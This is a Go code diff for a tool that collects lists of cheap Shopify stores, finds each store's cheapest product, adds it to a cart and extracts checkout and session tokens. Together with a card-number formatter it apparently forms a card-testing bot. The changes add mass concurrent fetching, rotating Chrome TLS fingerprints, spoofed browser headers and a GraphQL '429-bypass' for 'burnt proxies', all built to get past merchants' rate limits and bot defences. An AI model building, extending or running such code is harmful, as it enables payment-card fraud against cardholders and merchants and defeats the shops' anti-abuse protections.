@@ -17,9 +17,12 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"path/filepath"
 	"regexp"
+	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	fhttp "github.com/bogdanfinn/fhttp"
@@ -109,59 +112,123 @@ func chooseAffordableSite(apiURL string, maxAmount float64) (WorkingSite, error)
 }
 
 func fetchAffordableSites(apiURL string, maxAmount float64) ([]WorkingSite, error) {
-	// The API caps at 100 results per page — paginate through all pages
-	const pageSize = 100
+	const pageSize = 500
+	const maxPages = 4000
+	const fetchConcurrency = 40
+
+	type pageResult struct {
+		offset  int
+		objects []map[string]any
+		total   int64
+		html    string
+		err     error
+	}
+
+	httpClient := &http.Client{Timeout: 15 * time.Second}
+
+	fetchPage := func(offset int) pageResult {
+		pageURL := fmt.Sprintf("%s?limit=%d&offset=%d", apiURL, pageSize, offset)
+
+		var body []byte
+		maxRetries := 3
+		for attempt := 0; attempt < maxRetries; attempt++ {
+			req, reqErr := http.NewRequest("GET", pageURL, nil)
+			if reqErr != nil {
+				return pageResult{offset: offset, err: reqErr}
+			}
+			req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+			req.Header.Set("accept-language", "en-US,en;q=0.9")
+			req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
+
+			resp, err := httpClient.Do(req)
+			if err != nil {
+				if attempt < maxRetries-1 && isTransientErr(err) {
+					time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
+					continue
+				}
+				return pageResult{offset: offset, err: err}
+			}
+			body, _ = io.ReadAll(resp.Body)
+			resp.Body.Close()
+			break
+		}
+
+		bodyStr := string(body)
+		if strings.HasPrefix(strings.TrimSpace(bodyStr), "<!DOCTYPE html") || strings.Contains(bodyStr, "<tbody>") {
+			return pageResult{offset: offset, html: bodyStr}
+		}
+
+		var payload map[string]any
+		if err := json.Unmarshal(body, &payload); err != nil {
+			return pageResult{offset: offset, err: err}
+		}
+		var total int64
+		if raw, ok := payload["total"]; ok {
+			if n, ok := toFloat(raw); ok {
+				total = int64(n)
+			}
+		}
+		return pageResult{offset: offset, objects: collectObjects(payload), total: total}
+	}
+
+	first := fetchPage(0)
+	if first.err != nil {
+		return nil, first.err
+	}
+	if first.html != "" {
+		sites := parseDashboardHTMLSites(first.html, maxAmount)
+		fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f) [HTML]\n", len(sites), maxAmount)
+		return sites, nil
+	}
+
+	total := first.total
+	pagesNeeded := 1
+	if total > 0 {
+		pagesNeeded = int((total + pageSize - 1) / pageSize)
+	}
+	if pagesNeeded > maxPages {
+		pagesNeeded = maxPages
+	}
+	fmt.Printf("[SITES] API total=%d, fetching %d pages (%d/page)\n", total, pagesNeeded, pageSize)
+
+	pages := make(map[int]pageResult, pagesNeeded)
+	pages[0] = first
+
+	if pagesNeeded > 1 {
+		resultsCh := make(chan pageResult, pagesNeeded-1)
+		sem := make(chan struct{}, fetchConcurrency)
+		var wg sync.WaitGroup
+		for i := 1; i < pagesNeeded; i++ {
+			wg.Add(1)
+			go func(offset int) {
+				defer wg.Done()
+				sem <- struct{}{}
+				defer func() { <-sem }()
+				resultsCh <- fetchPage(offset)
+			}(i * pageSize)
+		}
+		go func() {
+			wg.Wait()
+			close(resultsCh)
+		}()
+		for pr := range resultsCh {
+			if pr.err != nil {
+				continue
+			}
+			pages[pr.offset] = pr
+		}
+	}
+
+	var offsets []int
+	for o := range pages {
+		offsets = append(offsets, o)
+	}
+	sort.Ints(offsets)
+
 	var out []WorkingSite
 	seen := make(map[string]bool)
-
-	httpClient := &http.Client{Timeout: 10 * time.Second}
-
-	for offset := 0; ; offset += pageSize {
-		pageURL := fmt.Sprintf("%s?limit=%d&offset=%d", apiURL, pageSize, offset)
-		resp, err := httpClient.Get(pageURL)
-		if err != nil {
-			if len(out) > 0 {
-				break // return what we have so far
-			}
-			return nil, fmt.Errorf("GET %s: %w", pageURL, err)
-		}
-
-		body, err := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		if err != nil {
-			if len(out) > 0 {
-				break
-			}
-			return nil, fmt.Errorf("read API body: %w", err)
-		}
-
-		if resp.StatusCode != http.StatusOK {
-			if len(out) > 0 {
-				break
-			}
-			return nil, fmt.Errorf("GET %s returned status %d", pageURL, resp.StatusCode)
-		}
-
-		bodyStr := strings.TrimSpace(string(body))
-		if strings.HasPrefix(bodyStr, "<!DOCTYPE html") || strings.Contains(bodyStr, "<tbody>") {
-			sites := parseDashboardHTMLSites(bodyStr, maxAmount)
-			return sites, nil
-		}
-
-		var payload any
-		if err := json.Unmarshal(body, &payload); err != nil {
-			if len(out) > 0 {
-				break
-			}
-			return nil, fmt.Errorf("parse API JSON: %w", err)
-		}
-
-		pageSites := collectObjects(payload)
-		if len(pageSites) == 0 {
-			break // no more results
-		}
-
-		for _, obj := range pageSites {
+	for _, o := range offsets {
+		for _, obj := range pages[o].objects {
 			siteURL := extractSiteURL(obj)
 			if siteURL == "" {
 				continue
@@ -176,16 +243,12 @@ func fetchAffordableSites(apiURL string, maxAmount float64) ([]WorkingSite, erro
 			seen[siteURL] = true
 			out = append(out, WorkingSite{URL: siteURL, Amount: amount})
 		}
-
-		if len(pageSites) < pageSize {
-			break // last page
-		}
 	}
 
 	if len(out) == 0 {
 		return nil, fmt.Errorf("no affordable sites found in API payload")
 	}
-	fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f)\n", len(out), maxAmount)
+	fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f) out of %d total\n", len(out), maxAmount, total)
 	return out, nil
 }
 
@@ -297,89 +360,496 @@ func toFloat(v any) (float64, bool) {
 	}
 }
 
+func isTransientErr(err error) bool {
+	if err == nil {
+		return false
+	}
+	lower := strings.ToLower(err.Error())
+	return strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")
+}
+
+// doWithRetry retries transient errors and honors HTTP 429 Retry-After.
+func doWithRetry(client tls_client.HttpClient, req *fhttp.Request, maxRetries int) (*fhttp.Response, error) {
+	var lastErr error
+	for attempt := 0; attempt < maxRetries; attempt++ {
+		resp, err := client.Do(req)
+		if err != nil {
+			lastErr = err
+			if attempt < maxRetries-1 && isTransientErr(err) {
+				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
+				if req.GetBody != nil {
+					if body, gbErr := req.GetBody(); gbErr == nil {
+						req.Body = body
+					}
+				}
+				continue
+			}
+			return nil, err
+		}
+		if resp.StatusCode == 429 && attempt < maxRetries-1 {
+			retryAfter := 0
+			if ra := resp.Header.Get("Retry-After"); ra != "" {
+				if secs, e := strconv.Atoi(ra); e == nil && secs > 0 {
+					retryAfter = secs
+				}
+			}
+			resp.Body.Close()
+			var wait time.Duration
+			if retryAfter > 0 {
+				wait = time.Duration(retryAfter) * time.Second
+			} else {
+				wait = time.Duration(2000*(attempt+1)) * time.Millisecond
+			}
+			wait += time.Duration(rand.Intn(500)) * time.Millisecond
+			time.Sleep(wait)
+			if req.GetBody != nil {
+				if body, gbErr := req.GetBody(); gbErr == nil {
+					req.Body = body
+				}
+			}
+			continue
+		}
+		return resp, nil
+	}
+	return nil, lastErr
+}
+
 // ──────────────────────── Step 0: find cheapest available product ────
 
+type productCacheEntry struct {
+	title     string
+	productID string
+	variantID string
+	priceStr  string
+	expiresAt int64
+}
+
+var productCache sync.Map
+const productCacheTTL = 5 * 60 // 5 minutes
+
 func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
-	reqURL := shopURL + "/products.json?limit=250"
-	resp, err := client.Get(reqURL)
+	if cached, ok := productCache.Load(shopURL); ok {
+		entry := cached.(productCacheEntry)
+		if time.Now().Unix() < entry.expiresAt {
+			return entry.title, entry.productID, entry.variantID, entry.priceStr, nil
+		}
+	}
+
+	productTitle, productID, variantID, priceStr, err = findCheapestProductUncached(client, shopURL)
 	if err != nil {
-		return "", "", "", "", fmt.Errorf("GET %s: %w", reqURL, err)
+		// GraphQL fallback — the Storefront /api/graphql endpoint is not subject
+		// to the same per-route throttle as /products.json, so burnt proxies
+		// can still fetch products + variant IDs + prices here.
+		gqlTitle, gqlPID, gqlVID, gqlPrice, gqlErr := findCheapestProductViaGraphQL(client, shopURL)
+		if gqlErr == nil {
+			productTitle, productID, variantID, priceStr, err = gqlTitle, gqlPID, gqlVID, gqlPrice, nil
+		} else {
+			err = gqlErr
+		}
 	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		return "", "", "", "", fmt.Errorf("GET %s returned status %d", reqURL, resp.StatusCode)
+	if err == nil && productID != "" {
+		productCache.Store(shopURL, productCacheEntry{
+			title:     productTitle,
+			productID: productID,
+			variantID: variantID,
+			priceStr:  priceStr,
+			expiresAt:  time.Now().Unix() + productCacheTTL,
+		})
 	}
+	return
+}
 
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return "", "", "", "", fmt.Errorf("reading body: %w", err)
-	}
-
-	var data ProductsResponse
-	if err := json.Unmarshal(body, &data); err != nil {
-		return "", "", "", "", fmt.Errorf("parsing JSON: %w", err)
-	}
-
+func findCheapestProductUncached(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
 	bestPrice := math.MaxFloat64
 	found := false
 
-	for _, p := range data.Products {
-		for _, v := range p.Variants {
-			if !v.Available {
-				continue
+	urlsToTry := []string{
+		shopURL + "/products.json?limit=250",
+		shopURL + "/products.json",
+	}
+
+	var lastStatus int
+	var lastFetchErr error
+
+	for _, reqURL := range urlsToTry {
+		body, fetchErr := fetchProductPage(client, reqURL, shopURL)
+		if fetchErr != nil {
+			lastFetchErr = fetchErr
+			lastStatus = extractStatusCode(fetchErr)
+			// If we hit a 429, the second URL will 429 too — skip to GraphQL fallback.
+			if lastStatus == 429 {
+				break
 			}
-			price, convErr := strconv.ParseFloat(v.Price, 64)
-			if convErr != nil {
+			continue
+		}
+
+		var data ProductsResponse
+		if jsonErr := json.Unmarshal(body, &data); jsonErr != nil {
+			continue
+		}
+
+		pageCount := len(data.Products)
+
+		for _, p := range data.Products {
+			for _, v := range p.Variants {
+				if !v.Available {
+					continue
+				}
+				price, convErr := strconv.ParseFloat(v.Price, 64)
+				if convErr != nil {
+					continue
+				}
+				if price < bestPrice {
+					bestPrice = price
+					productTitle = p.Title
+					productID = strconv.FormatInt(p.ID, 10)
+					variantID = strconv.FormatInt(v.ID, 10)
+					priceStr = v.Price
+					found = true
+				}
+			}
+		}
+
+		if !found {
+			continue
+		}
+
+		if pageCount < 250 {
+			break
+		}
+
+		for page := 2; page <= 5; page++ {
+			pageURL := shopURL + fmt.Sprintf("/products.json?limit=250&page=%d", page)
+			pageBody, pageErr := fetchProductPage(client, pageURL, shopURL)
+			if pageErr != nil {
+				break
+			}
+
+			var pageData ProductsResponse
+			if jsonErr := json.Unmarshal(pageBody, &pageData); jsonErr != nil {
+				break
+			}
+
+			if len(pageData.Products) == 0 {
+				break
+			}
+
+			for _, p := range pageData.Products {
+				for _, v := range p.Variants {
+					if !v.Available {
+						continue
+					}
+					price, convErr := strconv.ParseFloat(v.Price, 64)
+					if convErr != nil {
+						continue
+					}
+					if price < bestPrice {
+						bestPrice = price
+						productTitle = p.Title
+						productID = strconv.FormatInt(p.ID, 10)
+						variantID = strconv.FormatInt(v.ID, 10)
+						priceStr = v.Price
+						found = true
+					}
+				}
+			}
+
+			if len(pageData.Products) < 250 {
+				break
+			}
+		}
+		break
+	}
+
+	if !found {
+		statusMsg := ""
+		if lastStatus > 0 {
+			statusMsg = fmt.Sprintf(" (last status: %d)", lastStatus)
+		} else if lastFetchErr != nil {
+			statusMsg = fmt.Sprintf(" (last err: %v)", lastFetchErr)
+		}
+		return "", "", "", "", fmt.Errorf("no available products found at %s%s", shopURL, statusMsg)
+	}
+	return productTitle, productID, variantID, priceStr, nil
+}
+
+// findCheapestProductViaGraphQL is the 429-bypass path. The Storefront
+// /api/graphql endpoint is not subject to the same per-route throttle as
+// /products.json, so burnt proxies can still fetch products + variant IDs +
+// prices here. Returns gid://shopify/... IDs stripped to their numeric part.
+func findCheapestProductViaGraphQL(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
+	bestPrice := math.MaxFloat64
+	found := false
+
+	query := `{"query":"{ products(first:250) { edges { node { id title availableForSale variants(first:10) { edges { node { id title priceV2 { amount currencyCode } } } } } } } }"}`
+
+	req, reqErr := fhttp.NewRequest("POST", shopURL+"/api/graphql", strings.NewReader(query))
+	if reqErr != nil {
+		return "", "", "", "", fmt.Errorf("building graphql request: %w", reqErr)
+	}
+	req.Header.Set("accept", "application/json")
+	req.Header.Set("accept-language", "en-US,en;q=0.9")
+	req.Header.Set("content-type", "application/json")
+	req.Header.Set("origin", shopURL)
+	req.Header.Set("referer", shopURL+"/")
+	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
+	req.Header.Set("sec-ch-ua-mobile", "?0")
+	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
+	req.Header.Set("sec-fetch-dest", "empty")
+	req.Header.Set("sec-fetch-mode", "cors")
+	req.Header.Set("sec-fetch-site", "same-origin")
+	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
+
+	resp, doErr := doWithRetry(client, req, 2)
+	if doErr != nil {
+		return "", "", "", "", fmt.Errorf("POST /api/graphql: %w", doErr)
+	}
+	defer resp.Body.Close()
+
+	body, readErr := io.ReadAll(resp.Body)
+	if readErr != nil {
+		return "", "", "", "", fmt.Errorf("reading graphql response: %w", readErr)
+	}
+	if resp.StatusCode != http.StatusOK {
+		return "", "", "", "", fmt.Errorf("POST /api/graphql returned status %d", resp.StatusCode)
+	}
+
+	bodyStr := string(body)
+	if strings.Contains(bodyStr, `"errors"`) {
+		return "", "", "", "", fmt.Errorf("graphql errors: %s", truncateForLog(bodyStr, 300))
+	}
+
+	var gqlResp struct {
+		Data struct {
+			Products struct {
+				Edges []struct {
+					Node struct {
+						ID               string `json:"id"`
+						Title            string `json:"title"`
+						AvailableForSale bool   `json:"availableForSale"`
+						Variants         struct {
+							Edges []struct {
+								Node struct {
+									ID      string `json:"id"`
+									Title   string `json:"title"`
+									PriceV2 struct {
+										Amount       string `json:"amount"`
+										CurrencyCode string `json:"currencyCode"`
+									} `json:"priceV2"`
+								} `json:"node"`
+							} `json:"edges"`
+						} `json:"variants"`
+					} `json:"node"`
+				} `json:"edges"`
+			} `json:"products"`
+		} `json:"data"`
+	}
+	if jErr := json.Unmarshal(body, &gqlResp); jErr != nil {
+		return "", "", "", "", fmt.Errorf("graphql parse: %w (body: %s)", jErr, truncateForLog(bodyStr, 200))
+	}
+
+	for _, edge := range gqlResp.Data.Products.Edges {
+		p := edge.Node
+		if !p.AvailableForSale {
+			continue
+		}
+		pidGID := p.ID
+		pidTitle := p.Title
+		for _, ve := range p.Variants.Edges {
+			v := ve.Node
+			vidGID := v.ID
+			priceVal := v.PriceV2.Amount
+			price, convErr := strconv.ParseFloat(priceVal, 64)
+			if convErr != nil || price <= 0 {
 				continue
 			}
 			if price < bestPrice {
 				bestPrice = price
-				productTitle = p.Title
-				productID = strconv.FormatInt(p.ID, 10)
-				variantID = strconv.FormatInt(v.ID, 10)
-				priceStr = v.Price
+				variantID = stripGID(vidGID)
+				productID = stripGID(pidGID)
+				productTitle = pidTitle
+				priceStr = priceVal
 				found = true
 			}
 		}
 	}
 
 	if !found {
-		return "", "", "", "", fmt.Errorf("no available products found at %s", shopURL)
+		return "", "", "", "", fmt.Errorf("graphql: no available variants at %s", shopURL)
 	}
+	fmt.Printf("[GQL] %s fallback: variant=%s price=%s\n", shopURL, variantID, priceStr)
 	return productTitle, productID, variantID, priceStr, nil
+}
+
+func truncateForLog(s string, n int) string {
+	if len(s) <= n {
+		return s
+	}
+	return s[:n] + "..."
+}
+
+// stripGID converts "gid://shopify/ProductVariant/<id>" or
+// "gid://shopify/Product/<id>" to the trailing "<id>" portion.
+func stripGID(gid string) string {
+	if i := strings.LastIndex(gid, "/"); i >= 0 {
+		return gid[i+1:]
+	}
+	return gid
+}
+
+func fetchProductPage(client tls_client.HttpClient, reqURL, shopURL string) ([]byte, error) {
+	maxRetries := 5
+	var lastErr error
+	for attempt := 0; attempt < maxRetries; attempt++ {
+		req, reqErr := fhttp.NewRequest("GET", reqURL, nil)
+		if reqErr != nil {
+			return nil, fmt.Errorf("building request: %w", reqErr)
+		}
+		req.Header.Set("accept", "application/json, text/javascript, */*; q=0.01")
+		req.Header.Set("accept-language", "en-US,en;q=0.9")
+		req.Header.Set("cache-control", "no-cache")
+		req.Header.Set("pragma", "no-cache")
+		req.Header.Set("referer", shopURL+"/")
+		req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
+		req.Header.Set("sec-ch-ua-mobile", "?0")
+		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
+		req.Header.Set("sec-fetch-dest", "empty")
+		req.Header.Set("sec-fetch-mode", "cors")
+		req.Header.Set("sec-fetch-site", "same-origin")
+		req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
+		req.Header.Set("x-requested-with", "XMLHttpRequest")
+
+		resp, doErr := client.Do(req)
+		if doErr != nil {
+			lastErr = doErr
+			lower := strings.ToLower(doErr.Error())
+			if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
+				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
+				continue
+			}
+			return nil, fmt.Errorf("GET %s: %w", reqURL, doErr)
+		}
+
+		if resp.StatusCode == http.StatusOK {
+			body, readErr := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			if readErr != nil {
+				lastErr = readErr
+				lower := strings.ToLower(readErr.Error())
+				if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
+					time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
+					continue
+				}
+				return nil, fmt.Errorf("reading body: %w", readErr)
+			}
+			return body, nil
+		}
+
+		statusCode := resp.StatusCode
+		resp.Body.Close()
+		lastErr = fmt.Errorf("status %d", statusCode)
+
+		return nil, fmt.Errorf("GET %s returned status %d", reqURL, statusCode)
+	}
+	if lastErr == nil {
+		lastErr = fmt.Errorf("max retries exceeded")
+	}
+	return nil, fmt.Errorf("GET %s: max retries exceeded (last: %v)", reqURL, lastErr)
+}
+
+func extractStatusCode(fetchErr error) int {
+	re := regexp.MustCompile(`status (\d+)`)
+	if m := re.FindStringSubmatch(fetchErr.Error()); len(m) > 1 {
+		code, _ := strconv.Atoi(m[1])
+		return code
+	}
+	return 0
 }
 
 // ──────────────────────── Step 1: add to cart → checkout ─────────────
 
-func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID string) (checkoutURL, checkoutToken, sessionToken, checkoutHTML string, err error) {
-	// ── POST /cart/add.js ──
-	payload := fmt.Sprintf(`{"id":%s,"quantity":1}`, variantID)
-	addReq, err := fhttp.NewRequest("POST", shopURL+"/cart/add.js", strings.NewReader(payload))
+func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID string) (effectiveShopURL, checkoutURL, checkoutToken, sessionToken, checkoutHTML string, err error) {
+	effectiveShopURL = shopURL
+
+	// cartAddAndFetch does POST /cart/add.js + GET /checkout on the given base URL.
+	cartAddAndFetch := func(baseURL string) (*fhttp.Response, error) {
+		payload := fmt.Sprintf(`{"id":%s,"quantity":1}`, variantID)
+		addReq, err := fhttp.NewRequest("POST", baseURL+"/cart/add.js", strings.NewReader(payload))
+		if err != nil {
+			return nil, fmt.Errorf("building cart request: %w", err)
+		}
+		addReq.Header.Set("Content-Type", "application/json")
+		addReq.Header.Set("accept", "application/json")
+		addReq.Header.Set("accept-language", "en-US,en;q=0.9")
+		addReq.Header.Set("origin", baseURL)
+		addReq.Header.Set("referer", baseURL+"/")
+		addReq.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
+		addReq.Header.Set("sec-ch-ua-mobile", "?0")
+		addReq.Header.Set("sec-ch-ua-platform", `"Windows"`)
+		addReq.Header.Set("sec-fetch-dest", "empty")
+		addReq.Header.Set("sec-fetch-mode", "cors")
+		addReq.Header.Set("sec-fetch-site", "same-origin")
+		addReq.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
+
+		addResp, err := doWithRetry(client, addReq, 2)
+		if err != nil {
+			return nil, fmt.Errorf("POST /cart/add.js: %w", err)
+		}
+		io.Copy(io.Discard, addResp.Body)
+		addResp.Body.Close()
+
+		if addResp.StatusCode != http.StatusOK {
+			return nil, fmt.Errorf("POST /cart/add.js returned status %d", addResp.StatusCode)
+		}
+
+		checkoutReq, err := fhttp.NewRequest("GET", baseURL+"/checkout", nil)
+		if err != nil {
+			return nil, fmt.Errorf("building checkout request: %w", err)
+		}
+		checkoutReq.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		checkoutReq.Header.Set("accept-language", "en-US,en;q=0.9")
+		checkoutReq.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
+		checkoutReq.Header.Set("sec-ch-ua-mobile", "?0")
+		checkoutReq.Header.Set("sec-ch-ua-platform", `"Windows"`)
+		checkoutReq.Header.Set("sec-fetch-dest", "document")
+		checkoutReq.Header.Set("sec-fetch-mode", "navigate")
+		checkoutReq.Header.Set("sec-fetch-site", "same-origin")
+		checkoutReq.Header.Set("upgrade-insecure-requests", "1")
+		checkoutReq.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
+
+		resp, err := doWithRetry(client, checkoutReq, 2)
+		if err != nil {
+			return nil, fmt.Errorf("GET /checkout: %w", err)
+		}
+		return resp, nil
+	}
+
+	resp, err := cartAddAndFetch(shopURL)
 	if err != nil {
-		return "", "", "", "", fmt.Errorf("building cart request: %w", err)
-	}
-	addReq.Header.Set("Content-Type", "application/json")
-
-	addResp, err := client.Do(addReq)
-	if err != nil {
-		return "", "", "", "", fmt.Errorf("POST /cart/add.js: %w", err)
-	}
-	defer addResp.Body.Close()
-	io.Copy(io.Discard, addResp.Body) // drain
-
-	if addResp.StatusCode != http.StatusOK {
-		return "", "", "", "", fmt.Errorf("POST /cart/add.js returned status %d", addResp.StatusCode)
+		return "", "", "", "", "", err
 	}
 
-	// ── GET /checkout (follows redirects) ──
-	checkoutResp, err := client.Get(shopURL + "/checkout")
-	if err != nil {
-		return "", "", "", "", fmt.Errorf("GET /checkout: %w", err)
+	// If checkout redirected to a different domain (myshopify.com -> custom domain),
+	// the cart cookie was on the wrong domain — redo cart-add + checkout on the real domain.
+	finalURL := resp.Request.URL.String()
+	finalBase := urlBase(finalURL)
+	if finalBase != "" && finalBase != shopURL {
+		resp.Body.Close()
+		resp2, err2 := cartAddAndFetch(finalBase)
+		if err2 != nil {
+			return "", "", "", "", "", err2
+		}
+		resp = resp2
+		effectiveShopURL = finalBase
 	}
-	defer checkoutResp.Body.Close()
+	defer resp.Body.Close()
 
-	checkoutURL = checkoutResp.Request.URL.String()
+	if resp.StatusCode != http.StatusOK {
+		return "", "", "", "", "", fmt.Errorf("GET /checkout returned status %d (landed: %s)",
+			resp.StatusCode, resp.Request.URL.String())
+	}
+
+	checkoutURL = resp.Request.URL.String()
 
 	// Extract checkout_token from URL: /checkouts/cn/{checkout_token}/
 	tokenRe := regexp.MustCompile(`/checkouts/cn/([^/?]+)`)
@@ -388,9 +858,9 @@ func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID strin
 	}
 
 	// Read HTML and extract session token
-	htmlBytes, err := io.ReadAll(checkoutResp.Body)
+	htmlBytes, err := io.ReadAll(resp.Body)
 	if err != nil {
-		return "", "", "", "", fmt.Errorf("reading checkout HTML: %w", err)
+		return "", "", "", "", "", fmt.Errorf("reading checkout HTML: %w", err)
 	}
 	checkoutHTML = string(htmlBytes)
 
@@ -401,7 +871,16 @@ func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID strin
 		sessionToken = strings.Trim(sessionToken, `"`)
 	}
 
-	return checkoutURL, checkoutToken, sessionToken, checkoutHTML, nil
+	return effectiveShopURL, checkoutURL, checkoutToken, sessionToken, checkoutHTML, nil
+}
+
+// urlBase extracts "https://host" from a full URL.
+func urlBase(rawURL string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil || u.Host == "" {
+		return ""
+	}
+	return u.Scheme + "://" + u.Host
 }
 
 // ──────────────────────── Step 2: fetch private access token ─────────
@@ -762,8 +1241,7 @@ func extractSellerMerchandisePrice(proposalBody string) string {
 }
 
 func extractSellerCurrency(proposalBody string) string {
-	// supportedCurrencies in the payment section shows the shop's actual currency
-	re := regexp.MustCompile(`"supportedCurrencies"\s*:\s*\["([^"]+)"`)
+	re := regexp.MustCompile(`"presentmentCurrency"\s*:\s*"([^"]+)"`)
 	m := re.FindStringSubmatch(proposalBody)
 	if len(m) < 2 {
 		return ""
@@ -772,13 +1250,32 @@ func extractSellerCurrency(proposalBody string) string {
 }
 
 func extractSellerCountry(proposalBody string) string {
-	// supportedCountries appears in sellerProposal payment section
-	re := regexp.MustCompile(`"supportedCountries"\s*:\s*\["([^"]+)"`)
+	re := regexp.MustCompile(`"buyerIdentity".*?"customer".*?"countryCode"\s*:\s*"([^"]+)"`)
 	m := re.FindStringSubmatch(proposalBody)
 	if len(m) < 2 {
 		return ""
 	}
 	return m[1]
+}
+
+func extractCurrencyFromHTML(checkoutHTML string) string {
+	re1 := regexp.MustCompile(`(?i)currencycode\s*[:=]\s*["']?([A-Za-z]{3})`)
+	if m := re1.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
+		return strings.ToUpper(m[1])
+	}
+	return ""
+}
+
+func extractCheckoutPriceFromHTML(checkoutHTML string) string {
+	re := regexp.MustCompile(`data-checkout-total-price="([^"]+)"`)
+	if m := re.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
+		return m[1]
+	}
+	re2 := regexp.MustCompile(`data-checkout-subtotal-price="([^"]+)"`)
+	if m := re2.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
+		return m[1]
+	}
+	return ""
 }
 
 func patchPayload(payload, currency, country string) string {
@@ -812,9 +1309,121 @@ func generatePageID() string {
 	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
 }
 
+// ──────────────────────── TLS profile rotation / page sniffing ───────
+
+var tlsProfiles = []profiles.ClientProfile{
+	profiles.Chrome_146,
+	profiles.Chrome_144,
+	profiles.Chrome_133,
+	profiles.Chrome_131,
+	profiles.Chrome_124,
+	profiles.Chrome_120,
+	profiles.Chrome_117,
+}
+
+func randomTLSProfile() profiles.ClientProfile {
+	return tlsProfiles[rand.Intn(len(tlsProfiles))]
+}
+
+// sniffPageType classifies a checkout HTML response so we can produce a
+// useful error instead of a generic "missing stableId" when a store is
+// password-protected, behind a CF challenge, has an empty cart, etc.
+func sniffPageType(s string) string {
+	if s == "" {
+		return "EMPTY_BODY"
+	}
+	lower := strings.ToLower(s)
+	switch {
+	case strings.Contains(lower, "cf-challenge") ||
+		strings.Contains(lower, "challenge-platform") ||
+		strings.Contains(lower, "just a moment..."):
+		return "CF_CHALLENGE"
+	case strings.Contains(lower, "enter using password") ||
+		strings.Contains(lower, "enter store using password") ||
+		strings.Contains(lower, `id="password"`) ||
+		strings.Contains(lower, "/password"):
+		return "PASSWORD_PAGE"
+	case strings.Contains(lower, "your cart is empty") ||
+		strings.Contains(lower, "cart is empty") ||
+		strings.Contains(lower, "empty cart"):
+		return "EMPTY_CART"
+	case strings.Contains(lower, "page not found") || strings.Contains(lower, "404 not found"):
+		return "NOT_FOUND"
+	case strings.Contains(lower, "access denied") || strings.Contains(lower, "you don't have permission"):
+		return "ACCESS_DENIED"
+	case strings.Contains(lower, "shopify-checkout"):
+		return "CHECKOUT_NO_SPA"
+	}
+	return "UNKNOWN"
+}
+
+func formatCardNumber(cc string) string {
+	var parts []string
+	for i := 0; i < len(cc); i += 4 {
+		end := i + 4
+		if end > len(cc) {
+			end = len(cc)
+		}
+		parts = append(parts, cc[i:end])
+	}
+	return strings.Join(parts, " ")
+}
+
+// createNoProxyClient builds a tls-client with a fresh cookie jar and a
+// random Chrome profile, used as a fallback when a proxied request fails.
+func createNoProxyClient() (tls_client.HttpClient, error) {
+	jar := tls_client.NewCookieJar()
+	return tls_client.NewHttpClient(tls_client.NewNoopLogger(),
+		tls_client.WithTimeoutSeconds(30),
+		tls_client.WithClientProfile(randomTLSProfile()),
+		tls_client.WithCookieJar(jar),
+	)
+}
+
